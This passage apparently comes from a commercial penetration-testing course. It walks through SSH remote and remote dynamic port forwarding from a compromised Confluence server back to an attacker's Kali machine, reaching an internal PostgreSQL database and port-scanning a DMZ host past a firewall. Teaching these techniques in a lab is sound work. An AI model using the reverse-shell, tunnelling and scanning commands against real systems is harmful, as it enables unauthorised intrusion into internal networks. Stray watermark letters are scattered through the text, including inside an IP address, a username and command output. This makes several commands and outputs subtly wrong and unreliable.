being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.
Let’s reconsider our lab scenario, and take a small step backwards.
As before, we compromise CONFLUENCE01 using CVE-2022-26134. However, in this scenario,
the administrators decided to improve network security by implementing a firewall at the
perimeter. The firewall is configured so that, regardless of whether we bind a port on the WAN
921 (OpenBSD manual, 2022), https://man.openbsd.org/ssh#R
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 589
Made in Morocco
Penetration Testing with Kali Linux
interface of CONFLUENCE01 or not, the only port we can connect to from our Kali machine is
TCP 8090.
As we did in the Socat section, we want to enumerate the PostgreSQL database running on port
5432 on PGDATABASE01. CONFLUENCE01 doesn’t have the tools to do this. Because of the
firewall, we can’t create any port forward that requires opening the listening port on
CONFLUENCE01.
However, CONFLUENCE01 does have an SSH client, and we can set up an SSH server on our Kali
machine. We can create a port forwarding setup much like the following diagram:
y
k
s
o
Figure 249: The SSH remote port forward setup
n
We can connect from CONFLUENCE01 to our Kali machine over SSH. The listening TCP port
2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed
by the Kali SSH server softwarei through the SSH tunnel back to the SSH client on
CONFLUENCE01. They are then fozrwarded to the PostgreSQL database port on PGDATABASE01.
Let’s set this up in our lab. First, we’ll need to enable the SSH server on our Kali machine.
D
OpenSSH server is preinstalled - all we need to do is start it.
Before you start the Kali SSH server, make sure you’ve set a strong, unique
password for the Kali user!
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali:
Listing 545 - Starting the SSH server on the Kali machine.
We can check that the SSH port is open as we expected using ss.
kali@kali:~$ sudo ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
users:(("sshd",pid=181432,fd=3))
tcp LISTEN 0 128 [::]:22 [::]:*
users:(("sshd",pid=181432,fd=4))
Listing 546 - Checking that the SSH server on the Kali machine is listening.
The SSH server is listening on port 22 on all interfaces for both IPv4 and IPv6.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 590
Made in Morocco
Penetration Testing with Kali Linux
Once we have a reverse shell from CONFLUENCE01, we ensure we have a TTY shell, then create
an SSH remote port forward as part of an SSH connection back to our Kali machine.
In order to connect back to the Kali SSH server using a username and password
you may have to explicity allow password-based authentication by setting
PasswordAuthentication to yes in /etc/ssh/sshd_config.
The SSH remote port forward option is -R, and has a very similar syntax to the local port forward
option. It also takes two socket pairs as the argument. The listening socket is defined first, and
the forwarding socket is second.
In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all
y
traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).
k
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty;
pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
s
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R
127.0.0.1:2345:10.4.50.215:5432 kali@192.168.o118.4
< 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.118.4n (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes i
Failed to add the host to the zlist of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.118.4's password:
Listing 547 - The SSH remote port forward being set up, connecting to the Kali machine.
D
The SSH connection back to our Kali machine was successful.
We can confirm that our remote port forward port is listening by checking if port 2345 is open on
our Kali loopback interface.
kali@kali:~$ ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp LISTEN 0 128 127.0.0.1:2345 0.0.0.0:*
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
tcp LISTEN 0 128 [::]:22 [::]:*
Listing 548 - Checking if port 2345 is bound on the Kali SSH server.
It is! Our port forward is now set up as we intended, with the SSH port forward command running
on CONFLUENCE01.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 591
Made in Morocco
Penetration Testing with Kali Linux
Figure 250: The SSH remote port forward command running
We can now start probing port 2345 on the loopback interface of your Kali machine, as though
we’re probing the PostgreSQL database port on PGDATABASE01 directly. On our Kali machine,
we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (-p), and using the database
k
credentials of the postgres user (-U) we found earlier on CONFLUENCE01.
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgress
Password for user postgres:
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
o
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
compression: off)
Type "help" for help.
n
postgres=# \l
List of databases
i
Name | Owner | Encoding | Collate | Ctype | Access privileges
z
------------+----------+----------+-------------+-------------+-----------------------
confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | DUTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
(4 rows)
postgres=#
Listing 549 - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward.
Success! We’re now interacting with the PostgreSQL instance running on PGDATABASE01
through our SSH remote port forward by connecting to port 2345 on our own Kali machine.
In this section, we created an SSH remote port forward to allow us to connect to an internal
database server from our Kali machine. We did this while traversing a perimeter firewall, which
would otherwise block inbound connections.
18.3.4 SSH Remote Dynamic Port Forwarding
With remote port forwarding, we were able to forward packets to one socket per SSH connection.
However, just as we found with local port forwarding, this single-socket-per-connection limitation
can slow us down. We often want more flexibility when attacking networks, especially in the
enumeration stages.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 592
Made in Morocco
Penetration Testing with Kali Linux
Luckily, remote dynamic port forwarding922 can provide this flexibility. Just as the name suggests,
remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The
SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.
To conceptualize how useful this might be, let’s apply it to our previous scenario. The following
diagram illustrates how the network layout would improve if we were to apply remote dynamic
port forwarding to the remote port forwarding scenario.
y
k
s
Figure 251: The SSH remote dynamic port forward layout applied to the remote port forward scenario
o
It’s much more flexible. Suddenly, we are able to connect to other ports and hosts through the
same connection.
n
Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain
all the flexibility of traditional dynamic port forwarding alongside the benefits of the remote
configuration. We are able to connecit to any port on any host that CONFLUENCE01 has access to
by passing SOCKS-formatted paczkets through the SOCKS proxy port that is bound on our Kali
machine.
D
Remote dynamic port forwarding has only been available since October 2017’s
OpenSSH 7.6.923 Despite this, only the OpenSSH client needs to be version 7.6 or
above to use it - the server version doesn’t matter.
Let extend our scenario again. This time we find a Windows server (MULTISERVER03) on the
DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any
port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH out from
CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start
enumerating MULTISERVER03 from Kali.
Once connected, our network should be organized much like the following diagram:
922 (OpenBSD manual, 2022), https://man.openbsd.org/ssh#R~5
923 (OpenSSH, 2017), https://www.openssh.com/txt/release-7.6
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 593
Made in Morocco
Penetration Testing with Kali Linux
y
k
Figure 252: The SSH remote dynamic port forward setup we are aiming for
The SSH session is initiated from CONFLUENCE01, csonnecting to the Kali machine, which is
running an SSH server. The SOCKS proxy port is then bound to the Kali machine on TCP/9998.
Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where
o
they will be forwarded based on where they’re addressed - in this case, MULTISERVER03.
To demonstrate exactly how useful remote dynamic port forwarding can be, let’s set up an
n
example in the lab. Once we have a reverse shell from CONFLUENCE01, have spawned a TTY
shell within it, and have enabled SSH on our Kali machine, we can start crafting the remote
dynamic port forwarding command.i
z
The remote dynamic port forwarding command is relatively simple, although (slightly confusingly)
it uses the same -R option as classic remote port forwarding. The difference is that when we
D
want to create a remote dynamic port forward, we pass only one socket: the socket we want to
listen on the SSH server. We don’t even need to specify an IP address; if we just pass a port, it will
be bound to the loopback interface of the SSH server by default.
To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply
specify -R 9998 to the SSH command we run on CONFLUENCE01. We’ll also pass the -N flag to
prevent a shell from being opened.
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty;
pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998
kali@192.168.118.4
<n/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.118.4's password:
Listing 550 - Making the SSH connection with the remote dynamic port forwarding option.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 594
Made in Morocco
Penetration Testing with Kali Linux
Back on our Kali machine, we can check that port 9998 is bound by using ss.
kali@kali:~$ sudo ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:*
users:(("sshd",pid=939038,fd=9))
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
users:(("sshd",pid=181432,fd=3))
tcp LISTEN 0 128 [::1]:9998 [::]:*
users:(("sshd",pid=939038,fd=7))
tcp LISTEN 0 128 [::]:22 [::]:*
users:(("sshd",pid=181432,fd=4))
Listing 551 - Port 9998 bound to both IPv4 and IPv6 loopback interfaces on the Kali machine.
The SOCKS proxy port has been bound on both the IPv4 and IPv6 loopback interfaces on our Kali
machine. We’re ready to use it! y
Just as we did in the classic dynamic port forwarding example, we can use Proxychains to tunnel
traffic over this SOCKS proxy port. We’ll edit our Pkroxychains configuration file at
/etc/proxychains4.conf on our Kali machine to reflect our new local SOCKS proxy port.
s
kali@kali:~$ tail /etc/proxychains4.conf
# proxy types: http, socks4, socks5, raw
o
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-http "user/pass"-socks )
#
n
[ProxyList]
# add proxy here ...
# meanwile
i
# defaults set to "tor"
z
socks5 127.0.0.1 9998
Listing 552 - Editing the Proxychains configuration file to point to the new SOCKS proxy on port 9998.
D
We can then run nmap with proxychains as we did before, this time against MULTISERVER03.
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be
slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 06:25 EDT
Initiating Connect Scan at 06:25
Scanning 10.4.50.64 [20 ports]
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:22 <--socket error or
timeout!
...
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:135 ... OK
Discovered open port 135/tcp on 10.4.50.64
Completed Connect Scan at 06:28, 210.26s elapsed (20 total ports)
Nmap scan report for 10.4.50.64
Host is up, received user-set (6.7s latency).
Scanned at 2022-07-20 06:25:25 EDT for 210s
PORT STATE SERVICE REASON
21/tcp closed ftp conn-refused
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 595
Made in Morocco
Penetration Testing with Kali Linux
22/tcp closed ssh conn-refused
23/tcp closed telnet conn-refused
25/tcp closed smtp conn-refused
53/tcp closed domain conn-refused
80/tcp open http syn-ack
110/tcp closed pop3 conn-refused
111/tcp closed rpcbind conn-refused
135/tcp open msrpc syn-ack
139/tcp closed netbios-ssn conn-refused
143/tcp closed imap conn-refused
443/tcp closed https conn-refused
445/tcp closed microsoft-ds conn-refused
993/tcp closed imaps conn-refused
995/tcp closed pop3s conn-refused
1723/tcp closed pptp conn-refused
3306/tcp closed mysql conn-refused y
3389/tcp open ms-wbt-server syn-ack
5900/tcp closed vnc conn-refused
8080/tcp closed http-proxy conn-refused k
Read data files from: /usr/bin/../share/nmap
s
Nmap done: 1 IP address (1 host up) scanned in 210.31 seconds
Listing 553 - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains.
o
After a few minutes, we receive our results and discover ports 80, 135, and 3389 are open.
n
Scanning is a little slower against this Windows host - likely due to the different
way the Windows firewall reisponds when a port is closed compared to Linux.
z
In this section, we used SSH remote dynamic port forwarding to open a SOCKS proxy port on our
D
Kali machine by initiating an SSH connection from a remote compromised host. We then used
Proxychains to port scan a host on the internal network through the SOCKS proxy port.
18.3.5 Using sshuttle
In situations where we have direct access to an SSH server, behind which is a more complex
internal network, classic dynamic port forwarding might be difficult to manage. sshuttle924 is a